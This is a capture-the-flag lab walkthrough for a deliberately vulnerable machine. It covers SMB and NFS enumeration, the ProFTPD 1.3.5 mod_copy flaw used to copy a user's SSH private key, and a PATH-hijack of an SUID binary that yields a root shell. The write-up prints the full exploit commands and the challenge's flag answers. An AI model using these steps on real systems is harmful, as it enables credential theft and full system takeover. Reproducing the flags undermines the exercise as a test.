# Kenobi

## Deploy the Vulnerable Machine

### Overview

This section will guide you through accessing a Samba share, exploiting a vulnerable version of ProFTPD to gain initial access, and escalating your privileges to root via an SUID binary. Follow the steps below and answer the questions provided.

### Q1. Connect to the Network and Deploy the Machine

#### Action

Make sure you're connected to the designated network and deploy the vulnerable machine provided in this room.

**Explanation:**  
Deploying the machine sets up the environment where you will perform your penetration testing activities. Ensure that your connection to the network is stable to avoid any interruptions during the deployment.

### Q2. Scan the Machine with Nmap

#### Action

Scan the target machine using the following Nmap command to discover open ports:

```bash
sudo nmap -vv -sS -T5 -A -p 1-10000 10.10.222.190
```

**Sample Output:**

```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-19 13:00 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
...
PORT     STATE    SERVICE        REASON         VERSION
21/tcp   open     ftp            syn-ack ttl 64 ProFTPD 1.3.5
22/tcp   open     ssh            syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http           syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open     rpcbind        syn-ack ttl 64 2-4 (RPC #100000)
139/tcp  open     netbios-ssn    syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn    syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open     nfs_acl        syn-ack ttl 64 2-3 (RPC #100227)
...
7
```

**Ans:** 7

**Explanation:**  
The Nmap scan reveals the number of open ports on the target machine. Identifying open ports is critical for understanding the attack surface and determining potential entry points for exploitation.


## Enumerating Samba for Shares

### Overview

Samba is the standard Windows interoperability suite of programs for Linux and Unix, allowing end users to access and use files, printers, and other commonly shared resources on a company's intranet or internet. It's often referred to as a network file system. Samba is based on the Server Message Block (SMB) protocol, which is developed exclusively for Windows. Without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

### Q1. Enumerate SMB Shares Using Nmap

#### Action

You can enumerate a machine for SMB shares using Nmap. The following command utilizes a script that automates the enumeration of shares and users:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.222.190
```

**Explanation:**  
SMB operates on two ports, 445 and 139. The above command targets port 445 and uses Nmap's scripting engine to list the available shares and users on the target machine.

**Sample Output:**

```
Nmap scan report for 10.10.139.109
Host is up (0.046s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.139.109\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|   \\10.10.139.109\anonymous: 
|     Type: STYPE_DISKTREE
|   \\10.10.139.109\print$: 
|     Type: STYPE_DISKTREE
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

**Ans:** 3

**Explanation:**  
The Nmap scan reveals three network shares on the target machine: `IPC$`, `anonymous`, and `print$`. Identifying these shares is essential for understanding the available resources and potential entry points for further exploration.

### Q2. Inspect a Samba Share Using smbclient

#### Action

On most Linux distributions, `smbclient` is already installed. To inspect one of the shares, use the following command:

```bash
smbclient //10.10.222.190/anonymous
```

**Sample Output:**

```
$ smbclient //10.10.139.109/anonymous
Enter SAMBA\unknown's password: 
smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019
```

**Ans:** log.txt

**Explanation:**  
By connecting to the `anonymous` share, you can list the files available. In this instance, `log.txt` is visible, which could contain important information for further investigation.

### Q3. Download SMB Share Recursively Using smbget

#### Action

You can recursively download the contents of an SMB share using the following command, with the username and password left as empty:

```bash
smbget -R smb://10.10.222.190/anonymous
```

**Sample Output:**

```
$ smbget -R smb://10.10.139.109/anonymous
Password for [unknown] connecting to //anonymous/10.10.139.109: 
Using workgroup SAMBA, user unknown
smb://10.10.139.109/anonymous/log.txt                                                                                                                            
Downloaded 11.95kB in 4 seconds

$ head -n 33 log.txt 
...
# Port 21 is the standard FTP port.
Port                21
```

**Ans:** 21

**Explanation:**  
The downloaded `log.txt` file reveals details about an SSH key and the ProFTPD server configuration, including that FTP runs on port 21.

### Q4. Enumerate NFS Shares Using Nmap

#### Action

Your earlier Nmap scan should have revealed port 111 running the `rpcbind` service, which is used to manage remote procedure calls (RPC). To enumerate the NFS shares, use the following Nmap command:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.222.190
```

**Sample Output:**

```
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.139.109
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 09:17 CEST
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

**Ans:** /var

**Explanation:**  
The Nmap script identifies the NFS mount `/var`, which could be used to access additional files or services on the target machine.

## Gain Initial Access with ProFTPD

### Overview

In this section, we'll use netcat to connect to the target machine on the FTP port and identify the version of ProFTPD running. We will then explore available exploits for this version, ultimately leveraging a vulnerability to gain access to the target system.

### Q1. Determine the Version of ProFTPD

#### Action

Use netcat to connect to the target machine on the FTP port and identify the ProFTPD version by running the following command:

```bash
nc 10.10.239.150 21
```

**Sample Output:**

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.239.150]
```

**Ans:** 1.3.5

**Explanation:**  
Identifying the version of the ProFTPD server is crucial as it allows us to search for known vulnerabilities that we can exploit to gain access to the system.

### Q2. Search for Exploits Using Searchsploit

#### Action

Searchsploit is a command-line search tool for exploit-db.com. Use it to find available exploits for the specific version of ProFTPD:

```bash
searchsploit proftpd 1.3.5
```

**Sample Output:**

```
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt
```

**Ans:** 3 exploits found

**Explanation:**  
The search results reveal three available exploits for ProFTPD version 1.3.5, indicating potential vulnerabilities that we can use to gain access to the target machine.

### Q3. Exploit ProFTPD's mod_copy Module

#### Action

You should have identified an exploit related to the mod_copy module. This module allows unauthenticated users to copy files from one location to another on the server using the SITE CPFR and SITE CPTO commands.

**Explanation:**  
The mod_copy module's vulnerability can be exploited to copy critical files, such as SSH keys, from the target system, which can then be used to gain unauthorized access.

### Q4. Copy Kenobi's SSH Key Using SITE Commands

#### Action

Use the SITE CPFR and SITE CPTO commands to copy Kenobi's SSH private key to a location that is accessible to you:

```bash
nc 10.10.239.150 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.239.150]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
quit
221 Goodbye.
```

**Explanation:**  
By copying the SSH private key to the `/var/tmp` directory, you make it accessible through the NFS mount identified earlier. This allows you to retrieve the key and use it for SSH access.

### Q5. Mount the /var/tmp Directory and Retrieve the SSH Key

#### Action

Mount the `/var/tmp` directory to your local machine, retrieve the SSH key, and use it to log in as the Kenobi user:

```bash
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.239.150:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS/tmp/
```

**Sample Output:**

```
-rw-r--r--.  1 unknown unknown 1675 May 14 11:03 id_rsa
```

Retrieve the key and set appropriate permissions:

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.239.150
```

**Ans:**  
Use the SSH key to connect to Kenobi's account and retrieve the user flag located at `/home/kenobi/user.txt`:

```bash
cat /home/kenobi/user.txt
```

**Sample Output:**

```
d0b0f3f53b6caa532a83915e19224899
```

**Explanation:**  
By successfully mounting the NFS share and retrieving the SSH key, you gain access to Kenobi's account. The user flag is a confirmation of your access.

## Privilege Escalation with Path Variable Manipulation

In this section, we'll explore the manipulation of the PATH variable as a method for privilege escalation. This technique involves exploiting binaries with the SUID bit set, which run with elevated privileges. By manipulating the PATH variable, we can substitute legitimate commands with malicious ones, thereby gaining root access.

| **Permission Bit** | **Effect on Files** | **Effect on Directories** | **Example Command** | **Example Output** |
|--------------------|---------------------|---------------------------|---------------------|---------------------|
| **SUID Bit (Set User ID)** | The file is executed with the privileges of the file owner, not the user running it. | No effect on directories. | `ls -l /usr/bin/passwd` | `-rwsr-xr-x 1 root root 54232 May 10 16:09 /usr/bin/passwd` |
| **SGID Bit (Set Group ID)** | The file is executed with the group ID of the file's group, not the user's group. | Files created in the directory inherit the group ID of the directory. | `ls -l /usr/bin/newgrp`<br>`ls -ld /var/shared` | `-rwxr-sr-x 1 root root 38936 May 10 16:09 /usr/bin/newgrp`<br>`drwxrwsr-x 2 user group 4096 May 10 16:09 /var/shared` |
| **Sticky Bit** | No effect on files. | Prevents users from deleting or renaming files owned by others in the directory. | `ls -ld /tmp` | `drwxrwxrwt 10 root root 4096 May 10 16:09 /tmp` |

### Q1. Identify Unusual SUID Files

#### Action

To search for files with the SUID bit set, which allows a user to execute the file with the permissions of the file owner, run the following command:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Sample Output:**

```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

**Ans:** /usr/bin/menu

**Explanation:**  
The `/usr/bin/menu` binary stands out as it is not a standard system binary, suggesting that it could be a custom script or program that may have been misconfigured, potentially leading to a privilege escalation vulnerability.

### Q2. Run the Menu Binary

#### Action

Run the `/usr/bin/menu` binary to see how many options it provides:

```bash
/usr/bin/menu
```

**Sample Output:**

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

**Ans:** 3

**Explanation:**  
The menu presents three options, which could execute system commands. Since the binary is SUID, these commands might run with elevated privileges, making it a candidate for exploitation.

### Q3. Exploit Path Variable Manipulation

#### Action

The `strings` command reveals the use of commands like `curl`, `uname -r`, and `ifconfig` without full paths, indicating the possibility of PATH variable manipulation. We can exploit this by creating a fake `curl` command that executes a shell:

```bash
cd /tmp/
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

**Sample Output:**

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm)
```

**Explanation:**  
By creating a fake `curl` command and placing it in a directory that is prioritized in the PATH variable, we trick the menu binary into executing our shell instead of the real `curl`. Since the menu binary runs with root privileges, this gives us a root shell.

### Q4. Retrieve the Root Flag

#### Action

With root access, retrieve the root flag located at `/root/root.txt`:

```bash
cat /root/root.txt
```

**Sample Output:**

```
177b3cd8562289f37382721c28381f02
```

**Ans:** 177b3cd8562289f37382721c28381f02

**Explanation:**  
By successfully exploiting the PATH manipulation, we gain root access and can read the root flag, confirming our privilege escalation.
